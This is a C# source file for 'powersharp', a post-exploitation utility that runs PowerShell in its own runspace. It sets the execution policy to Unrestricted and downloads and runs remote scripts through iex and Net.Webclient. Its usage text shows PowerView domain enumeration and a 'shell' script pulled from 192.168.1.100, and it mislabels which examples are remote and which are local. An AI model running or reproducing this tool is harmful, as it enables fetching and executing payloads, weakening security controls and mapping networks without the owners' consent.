using System;
using System.Collections.ObjectModel;
using System.Linq;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;


namespace powersharp
{
    public class Program
    {
        public static void Display()
        {
            Console.WriteLine("Usage: powersharp.exe \"/m:<Module>\" \"/c:<cmdlet>\"");
            Console.WriteLine("Import a remote module and execute a cmdlet: powersharp.exe \"/m:.\\powerview.ps1\" \"/c:Get-NetComputer | select dnshostname\" ");
            Console.WriteLine("Import a local module and execute a cmdlet: powersharp.exe \"/m:http://192.168.1.100/powerview.ps1'  \"/c:Get-NetComputer | select dnshostname\" ");
            Console.WriteLine("Execute a cmdlet without importing a module: powersharp.exe \"/m:\" '/c:Get-Process\" ");
            Console.WriteLine("Import a module without executing a cmdlet: powersharp.exe \"/m:http://192.168.1.100/shell\"  \"/c:\" ");
            Console.WriteLine("Recommend to minimize required output by ultilizing \"select\" ");
        }
        public static void Main(string[] args)
        {
            if (args.Length !=2 || !args[0].Substring(0,3).Contains("/m:") || !args[1].Substring(0, 3).Contains("/c:"))
            {
                Display();
                return;
            }
            String module = args[0].Substring(3);
            String command = args[1].Substring(3);
            if (module.Contains("http"))
            {
                command = "Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted -Force;iex(New-Object Net.Webclient).DownloadString('" + module + "')" + ";" + command;
            }
            else
            {
                if (module == "")
                {
                    command = "Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted -Force;"+ command;
                }
                else
                {
                    command = "Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted -Force;ipmo " + module + ";" + command;
                }
            }
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            ps.AddScript(command);
            StringBuilder stringBuilder = new StringBuilder();
            Collection<PSObject> output=ps.Invoke();
            foreach (PSObject O in output)
            {
                stringBuilder.AppendLine(O.ToString()+"\n");                     
            }
            Console.WriteLine(stringBuilder);
            rs.Close();
        }
    }

}
